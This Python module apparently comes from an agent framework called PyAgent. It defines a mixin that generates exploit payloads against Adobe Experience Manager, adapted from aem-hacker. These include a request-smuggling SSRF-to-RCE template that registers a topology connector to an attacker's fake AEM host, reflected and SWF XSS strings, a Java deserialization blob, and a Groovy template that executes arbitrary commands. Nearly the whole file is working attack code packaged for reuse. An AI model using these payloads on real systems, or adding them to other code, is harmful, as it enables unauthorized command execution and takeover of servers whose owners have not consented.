#!/usr/bin/env python3
# Copyright 2026 PyAgent Authors
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import base64
import json
import uuid
from typing import Dict, Any, List, Optional
from urllib.parse import quote

class PayloadGeneratorMixin:
    """
    Mixin providing payload generation capabilities for various exploits.
    
    Inspired by aem-hacker's hardcoded payloads for SSRF, RCE, XSS, etc.
    """
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._payload_templates: Dict[str, Dict] = {}
        self._load_default_templates()
        
    def _load_default_templates(self) -> None:
        """Load default payload templates."""
        # SSRF to RCE payload (inspired by aem_ssrf2rce.py)
        self._payload_templates['ssrf_rce'] = {
            'json_data_template': (
                '%7B%22ownerId%22%3A%22{uuid}%22%2C%22protocolVersion%22%3A1%2C'
                '%22created%22%3A1529002154280%2C%22inherited%22%3Afalse%2C'
                '%22serverInfo%22%3A%22{fakeaem}%3A80%22%2C%22localClusterView%22%3A%7B'
                '%22id%22%3A%22909ad6e7-463b-49b4-ba75-917112c8e530%22%2C'
                '%22instances%22%3A%5B%7B%22slingId%22%3A%22{uuid}%22%2C'
                '%22isLeader%22%3Atrue%2C%22cluster%22%3A%22665ad6e7-463b-49b4-ba75-917112c8e530%22'
                '%7D%5D%7D%7D'
            ),
            'params_template': (
                '?datacenter=http://localhost:4503/xxxx%23&company=xxx&username=x%22%0A'
                'Host%3A%20localhost%3A4503%0AContent-Length%3A0%0A%0A'
                'PUT%20/libs/sling/topology/connector%2E{uuid}%2Ejson%20HTTP/1%2E0%0A'
                'Host%3A%20localhost%3A4503%0AConnection%3A%20keep-alive%0A'
                'Content-Length%3A%20{length}%0AContent-Type%3A%20application/json%0A%0A'
                '{json_data}%0A%0A'
                'GET%20/%20HTTP/1%2E1%0AHost%3Alocalhost%3A4503%0A&secret=yyyy'
            )
        }
        
        # XSS payloads
        self._payload_templates['xss'] = {
            'swf_xss': [
                '?stagesize=1&namespacePrefix=window[/aler/.source%2b/t/.source](document.domain)-window',
                '?namespacePrefix=window[/aler/.source%2b/t/.source](document.domain)-window'
            ],
            'reflected_xss': [
                '<script>alert(document.domain)</script>',
                '<img src=x onerror=alert(document.domain)>',
                '"><script>alert(document.domain)</script>'
            ]
        }
        
        # Deserialization payload
        self._payload_templates['deserialization'] = {
            'java_object_array': base64.b64decode(
                'rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////c='
            )
        }
        
        # Groovy RCE payload
        self._payload_templates['groovy_rce'] = {
            'whoami': 'def%20command%20%3D%20%22whoami%22%0D%0Adef%20proc%20%3D%20command.execute%28%29%0D%0Aproc.waitFor%28%29%0D%0Aprintln%20%22%24%7Bproc.in.text%7D%22',
            'custom': 'def%20command%20%3D%20%22{cmd}%22%0D%0Adef%20proc%20%3D%20command.execute%28%29%0D%0Aproc.waitFor%28%29%0D%0Aprintln%20%22%24%7Bproc.in.text%7D%22'
        }
        
    def generate_ssrf_rce_payload(self, fake_aem_host: str) -> str:
        """
        Generate SSRF to RCE payload for AEM exploitation.
        
        Args:
            fake_aem_host: Hostname/IP of fake AEM server
            
        Returns:
            URL parameters string
        """
        template = self._payload_templates['ssrf_rce']
        uuid_val = str(uuid.uuid4())
        fakeaem_encoded = fake_aem_host.replace('.', '%2E')
        
        json_data = template['json_data_template'].format(uuid=uuid_val, fakeaem=fakeaem_encoded)
        length = len(json_data)
        
        params = template['params_template'].format(
            uuid=uuid_val,
            length=length,
            json_data=json_data
        )
        
        return params
        
    def generate_xss_payload(self, payload_type: str = 'reflected', index: int = 0) -> str:
        """
        Generate XSS payload.
        
        Args:
            payload_type: 'swf', 'reflected'
            index: Index of payload in list
            
        Returns:
            XSS payload string
        """
        key = f"{payload_type}_xss" if payload_type == 'swf' else payload_type
        payloads = self._payload_templates['xss'].get(key, [])
        if not payloads:
            return '<script>alert("XSS")</script>'
        return payloads[min(index, len(payloads) - 1)]
        
    def generate_deserialization_payload(self, payload_type: str = 'java_object_array') -> bytes:
        """
        Generate deserialization payload.
        
        Args:
            payload_type: Type of deserialization payload
            
        Returns:
            Payload bytes
        """
        return self._payload_templates['deserialization'].get(payload_type, b'')
        
    def generate_groovy_rce_payload(self, command: str = 'whoami') -> str:
        """
        Generate Groovy RCE payload.
        
        Args:
            command: Command to execute
            
        Returns:
            URL-encoded Groovy script
        """
        if command == 'whoami':
            return self._payload_templates['groovy_rce']['whoami']
        else:
            return self._payload_templates['groovy_rce']['custom'].format(cmd=quote(command))
            
    def add_payload_template(self, name: str, template: Dict[str, Any]) -> None:
        """
        Add custom payload template.
        
        Args:
            name: Template name
            template: Template dictionary
        """
        self._payload_templates[name] = template
        
    def get_payload_template(self, name: str) -> Optional[Dict[str, Any]]:
        """Get payload template by name."""
        return self._payload_templates.get(name)
        
    def list_payload_templates(self) -> List[str]:
        """List available payload template names."""
        return list(self._payload_templates.keys())
